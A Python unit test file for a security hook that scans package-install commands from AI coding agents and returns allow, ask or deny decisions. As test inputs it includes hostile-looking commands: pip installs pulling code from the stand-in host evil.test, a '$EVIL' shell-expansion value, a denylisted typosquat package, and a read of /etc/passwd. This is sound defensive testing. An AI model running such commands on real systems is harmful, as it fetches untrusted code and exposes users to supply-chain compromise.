"""Unit tests for the Claude Code / Codex PreToolUse hook integration.

These mirror the Hermes/OpenClaw test style: they exercise the full
payload → registry → scanner → response pipeline with mocked scan results
(no real network access), plus the agent-specific deny/ask rendering and
fail-closed behaviour.
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from agentshield.core.config import Config
from agentshield.core.models import (
    Decision,
    DecisionAction,
    Ecosystem,
    FileScanResult,
    Finding,
    ScanRequest,
    ScanResult,
    Severity,
)
from agentshield.core.scanner import AgentShield
from agentshield.integrations.claude_code import (
    CLAUDE_CODE,
    CODEX,
    HookDecision,
    HookResponse,
    evaluate_command,
    extract_command,
    render_response,
    run_hook,
)


def _make_shield(tmp_path: Path, extra_config: dict | None = None) -> AgentShield:
    base: dict = {"cache": {"db_path": str(tmp_path / "test.db")}}
    if extra_config:
        base.update(extra_config)
    return AgentShield(config=Config.model_validate(base))


def _clean_result(request: ScanRequest) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[],
        max_severity=Severity.NONE,
        decision=Decision(action=DecisionAction.ALLOW, reason="No issues found"),
    )


def _block_result(request: ScanRequest, finding: Finding) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[finding],
        max_severity=Severity.CRITICAL,
        decision=Decision(
            action=DecisionAction.BLOCK,
            reason=f"BLOCK due to {finding.rule_id}",
            findings=[finding],
        ),
    )


def _warn_result(request: ScanRequest, finding: Finding) -> ScanResult:
    return ScanResult(
        request=request,
        findings=[finding],
        max_severity=Severity.HIGH,
        decision=Decision(
            action=DecisionAction.NEEDS_CONFIRMATION,
            reason=f"NEEDS_CONFIRMATION due to {finding.rule_id}",
            findings=[finding],
        ),
    )


def _bash_payload(command: str) -> str:
    return json.dumps(
        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": command}}
    )


def _decision(stdout: str) -> str:
    """Pull the permissionDecision out of a hook stdout JSON blob."""
    return json.loads(stdout)["hookSpecificOutput"]["permissionDecision"]


# ── extract_command ───────────────────────────────────────────────────────────


def test_extract_command_from_tool_input():
    assert extract_command({"tool_input": {"command": "pip install x"}}) == "pip install x"


def test_extract_command_cmd_alias():
    assert extract_command({"tool_input": {"cmd": "npm i y"}}) == "npm i y"


def test_extract_command_code_alias():
    assert extract_command({"tool_input": {"code": "cargo add z"}}) == "cargo add z"


def test_extract_command_top_level_fallback():
    assert extract_command({"command": "pip install x"}) == "pip install x"


def test_extract_command_missing():
    assert extract_command({"tool_input": {"file_path": "/etc/passwd"}}) is None


def test_extract_command_no_tool_input():
    assert extract_command({"tool_name": "Read"}) is None


# ── pass-through (ALLOW) ──────────────────────────────────────────────────────


def test_no_install_command_passes_through(tmp_path):
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan", new=AsyncMock()) as mock_scan:
        resp = run_hook(_bash_payload("ls -la /tmp"), shield=shield)
    assert resp == HookResponse()  # empty stdout/stderr, exit 0
    mock_scan.assert_not_called()


def test_clean_package_passes_through(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source=CLAUDE_CODE)
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_clean_result(req))):
        resp = run_hook(_bash_payload("pip install requests"), shield=shield)
    assert resp.exit_code == 0
    assert resp.stdout == ""


def test_non_shell_tool_passes_through(tmp_path):
    shield = _make_shield(tmp_path)
    payload = json.dumps({"tool_name": "Read", "tool_input": {"file_path": "/x"}})
    with patch.object(shield, "ascan", new=AsyncMock()) as mock_scan:
        resp = run_hook(payload, shield=shield)
    assert resp.stdout == ""
    mock_scan.assert_not_called()


# ── BLOCK → deny ──────────────────────────────────────────────────────────────


def test_blocked_package_denies(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="evil-pkg", ecosystem=Ecosystem.PYPI, source=CLAUDE_CODE)
    finding = Finding(
        rule_id="T1.1", title="Known malicious package", severity=Severity.CRITICAL, source="db"
    )
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))):
        resp = run_hook(_bash_payload("pip install evil-pkg"), shield=shield)
    assert resp.exit_code == 0
    assert _decision(resp.stdout) == "deny"
    assert "evil-pkg" in resp.stdout


def test_blocked_npm_package_denies(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="evil-npm", ecosystem=Ecosystem.NPM, source=CLAUDE_CODE)
    finding = Finding(rule_id="T1.1", title="bad", severity=Severity.CRITICAL, source="db")
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))):
        resp = run_hook(_bash_payload("npm install evil-npm"), shield=shield)
    assert _decision(resp.stdout) == "deny"


def test_blocked_cargo_package_denies(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="evil-crate", ecosystem=Ecosystem.CARGO, source=CLAUDE_CODE)
    finding = Finding(rule_id="T1.1", title="bad", severity=Severity.CRITICAL, source="db")
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))):
        resp = run_hook(_bash_payload("cargo add evil-crate"), shield=shield)
    assert _decision(resp.stdout) == "deny"


# ── NEEDS_CONFIRMATION: claude-code asks, codex denies (fail-closed) ──────────


def test_warn_package_claude_code_asks(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="suspicious", ecosystem=Ecosystem.PYPI, source=CLAUDE_CODE)
    finding = Finding(
        rule_id="CVE-2024-9999", title="High CVE", severity=Severity.HIGH, source="osv"
    )
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))):
        resp = run_hook(_bash_payload("pip install suspicious"), shield=shield, agent=CLAUDE_CODE)
    assert _decision(resp.stdout) == "ask"


def test_warn_package_codex_denies(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="suspicious", ecosystem=Ecosystem.PYPI, source=CODEX)
    finding = Finding(
        rule_id="CVE-2024-9999", title="High CVE", severity=Severity.HIGH, source="osv"
    )
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))):
        resp = run_hook(_bash_payload("pip install suspicious"), shield=shield, agent=CODEX)
    # Codex does not honor "ask" (it fails open), so we fail closed with deny.
    assert _decision(resp.stdout) == "deny"


# ── fail-closed paths ─────────────────────────────────────────────────────────


def test_scan_error_fails_closed(tmp_path):
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan", new=AsyncMock(side_effect=RuntimeError("boom"))):
        resp = run_hook(_bash_payload("pip install something"), shield=shield)
    assert _decision(resp.stdout) == "deny"
    assert "fail closed" in resp.stdout


def test_unverifiable_manager_fails_closed(tmp_path):
    """gem has no scan backend — must be denied (real registry, no mock)."""
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan", new=AsyncMock()) as mock_scan:
        resp = run_hook(_bash_payload("gem install foo"), shield=shield)
    assert _decision(resp.stdout) == "deny"
    mock_scan.assert_not_called()  # never scanned — no backend


def test_shell_expansion_blocked_without_scanning(tmp_path):
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan", new=AsyncMock()) as mock_scan:
        resp = run_hook(_bash_payload("pip install $EVIL"), shield=shield)
    assert _decision(resp.stdout) == "deny"
    assert "$EVIL" in resp.stdout
    mock_scan.assert_not_called()


def test_vcs_url_blocked(tmp_path):
    shield = _make_shield(tmp_path)
    resp = run_hook(_bash_payload("pip install git+https://evil.test/p.git"), shield=shield)
    assert _decision(resp.stdout) == "deny"


def test_remote_requirements_blocked(tmp_path):
    shield = _make_shield(tmp_path)
    resp = run_hook(_bash_payload("pip install -r https://evil.test/req.txt"), shield=shield)
    assert _decision(resp.stdout) == "deny"


# ── multiple managers / one bad blocks the whole command ──────────────────────


def test_multiple_packages_one_bad_denies(tmp_path):
    shield = _make_shield(tmp_path)
    finding = Finding(rule_id="T1.1", title="bad", severity=Severity.CRITICAL, source="db")

    async def _side_effect(req: ScanRequest) -> ScanResult:
        if req.package == "evil-pkg":
            return _block_result(req, finding)
        return _clean_result(req)

    with patch.object(shield, "ascan", new=_side_effect):
        resp = run_hook(_bash_payload("pip install requests evil-pkg numpy"), shield=shield)
    assert _decision(resp.stdout) == "deny"
    assert "evil-pkg" in resp.stdout


def test_chained_managers_scanned(tmp_path):
    shield = _make_shield(tmp_path)
    captured: list[ScanRequest] = []

    async def _capture(req: ScanRequest) -> ScanResult:
        captured.append(req)
        return _clean_result(req)

    with patch.object(shield, "ascan", new=_capture):
        run_hook(_bash_payload("pip install requests && npm install express"), shield=shield)

    pairs = {(r.package, r.ecosystem) for r in captured}
    assert ("requests", Ecosystem.PYPI) in pairs
    assert ("express", Ecosystem.NPM) in pairs


# ── requirements-file scanning ────────────────────────────────────────────────


def test_requirements_file_scanned(tmp_path):
    shield = _make_shield(tmp_path)
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("evil-pkg==1.0.0\n")
    file_result = FileScanResult(
        path=str(req_file),
        results=[],
        aggregate_decision=Decision(action=DecisionAction.BLOCK, reason="1 package(s) blocked"),
        total_packages=1,
        blocked=1,
    )
    with patch.object(shield, "ascan_file", new=AsyncMock(return_value=file_result)) as mock_file:
        resp = run_hook(_bash_payload(f"pip install -r {req_file}"), shield=shield)
    mock_file.assert_called_once()
    assert _decision(resp.stdout) == "deny"
    assert str(req_file) in resp.stdout


def test_missing_requirements_file_passes_through(tmp_path):
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan_file", new=AsyncMock()) as mock_file:
        resp = run_hook(_bash_payload("pip install -r /nonexistent/req.txt"), shield=shield)
    mock_file.assert_not_called()
    assert resp.stdout == ""


# ── malformed / edge payloads ─────────────────────────────────────────────────


def test_malformed_payload_does_not_block(tmp_path):
    shield = _make_shield(tmp_path)
    with patch.object(shield, "ascan", new=AsyncMock()) as mock_scan:
        resp = run_hook("this is not json", shield=shield)
    assert resp.exit_code == 0
    assert resp.stdout == ""
    mock_scan.assert_not_called()


def test_empty_payload_does_not_block(tmp_path):
    shield = _make_shield(tmp_path)
    resp = run_hook("", shield=shield)
    assert resp == HookResponse()


def test_non_object_payload_does_not_block(tmp_path):
    shield = _make_shield(tmp_path)
    resp = run_hook("[1, 2, 3]", shield=shield)
    assert resp.stdout == ""


def test_unknown_agent_defaults_to_claude_code(tmp_path):
    shield = _make_shield(tmp_path)
    req = ScanRequest(package="suspicious", ecosystem=Ecosystem.PYPI, source="bogus")
    finding = Finding(rule_id="CVE-1", title="x", severity=Severity.HIGH, source="osv")
    with patch.object(shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))):
        resp = run_hook(_bash_payload("pip install suspicious"), shield=shield, agent="bogus")
    # Unknown agent → claude-code semantics → "ask".
    assert _decision(resp.stdout) == "ask"


# ── denylist via real scanner (no mock, no network) ───────────────────────────


def test_denylist_denies_via_real_scanner(tmp_path):
    shield = _make_shield(tmp_path, {"denylist": ["colouredlogs"]})
    resp = run_hook(
        _bash_payload("pip install --break-system-packages colouredlogs"), shield=shield
    )
    assert _decision(resp.stdout) == "deny"
    assert "colouredlogs" in resp.stdout.lower()


# ── render_response direct ────────────────────────────────────────────────────


def test_render_allow_is_empty():
    assert render_response(HookDecision(DecisionAction.ALLOW), CLAUDE_CODE) == HookResponse()


def test_render_log_async_is_empty():
    assert render_response(HookDecision(DecisionAction.LOG_ASYNC), CODEX) == HookResponse()


def test_render_block_is_deny():
    resp = render_response(HookDecision(DecisionAction.BLOCK, ["x: bad"]), CLAUDE_CODE)
    assert _decision(resp.stdout) == "deny"
    assert json.loads(resp.stdout)["hookSpecificOutput"]["hookEventName"] == "PreToolUse"


# ── evaluate_command direct (ecosystem mapping) ───────────────────────────────


@pytest.mark.asyncio
async def test_evaluate_command_maps_ecosystems(tmp_path):
    shield = _make_shield(tmp_path)
    captured: list[ScanRequest] = []

    async def _capture(req: ScanRequest) -> ScanResult:
        captured.append(req)
        return _clean_result(req)

    with patch.object(shield, "ascan", new=_capture):
        decision = await evaluate_command(shield, "cargo add serde", source=CODEX)

    assert decision.action == DecisionAction.ALLOW
    assert captured[0].package == "serde"
    assert captured[0].ecosystem == Ecosystem.CARGO
    assert captured[0].source == CODEX
